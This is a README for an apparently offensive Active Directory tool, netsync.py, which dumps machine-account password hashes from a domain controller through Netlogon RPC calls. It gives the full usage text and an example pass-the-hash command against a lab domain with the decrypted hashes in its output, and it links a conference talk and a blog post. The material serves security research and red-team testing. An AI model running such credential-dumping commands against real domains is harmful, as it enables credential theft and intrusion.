# NetSync

## Usage
```
usage: netsync.py [-h] -a ACCOUNT [-m {NetrServerPasswordGet,NetrServerTrustPasswordsGet,NetrServerGetTrustInfo}] [-ns NS] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-dc-ip ip address] [-keytab KEYTAB] target

positional arguments:
  target                [[domain/]username[:password]@]<targetName>

options:
  -h, --help            show this help message and exit
  -a ACCOUNT, --account ACCOUNT
                        Account name to dump hash.
  -m {NetrServerPasswordGet,NetrServerTrustPasswordsGet,NetrServerGetTrustInfo}, --method {NetrServerPasswordGet,NetrServerTrustPasswordsGet,NetrServerGetTrustInfo}
                        Method to dump hash.
  -ns NS                Nameserver to resolve targetName
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -keytab KEYTAB        Read keys for SPN from keytab file
```

## Example
```
╰─❯ python netsync.py redlab.com/'dc2019$'@dc2019.redlab.com -hashes :9dd4cd13786ba6fefcf9730a7f7b5195 -ns 10.211.55.5 -a 'dc2019$'                                

  _   _      _   ____                   
 | \ | | ___| |_/ ___| _   _ _ __   ___ 
 |  \| |/ _ \ __\___ \| | | | '_ \ / __|
 | |\  |  __/ |_ ___) | |_| | | | | (__ 
 |_| \_|\___|\__|____/ \__, |_| |_|\___|
                       |___/            

[*] HostName: dc2019.redlab.com -> Resolved: 10.211.55.5
[*] Using domain controller: dc2019.redlab.com for domain redlab.com
[*] Capabilities: 1076809540
[*] Authenticated successfully! have these capabilities: SupportsRC4, DoesNotRequireValidationLevel2, SupportsRefusePasswordChange, SupportsNetrLogonSendToSam, SupportsGenericPassThroughAuthentication, SupportsConcurrentRpcCalls, SupportsStrongKeys, SupportsTransitiveTrusts, SupportsNetrServerPasswordSet2, SupportsNetrLogonGetDomainInfo, SupportsCrossForestTrusts, SupportsRodcPassThroughToDifferentDomains, SupportsSecureRpc
[*] Tring to sync password for dc2019$ using credentials for dc2019$
[*] Decrypt Old Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
[*] Decrypt New Hash: 9dd4cd13786ba6fefcf9730a7f7b5195
```

Support 3 methods to get hash: NetrServerPasswordGet、NetrServerTrustPasswordsGet、NetrServerGetTrustInfo


## Links
* https://github.com/4ndr3w6/Presentations/blob/main/Texas_Cyber_Summit_2023/Slides/You_Disliked_DCSync_Wait_For_NetSync_Texas_Cyber_Summit_2023_Charlie_Andrew_Final.pdf
* https://trustedsec.com/blog/the-tale-of-the-lost-but-not-forgotten-undocumented-netsync-part-1



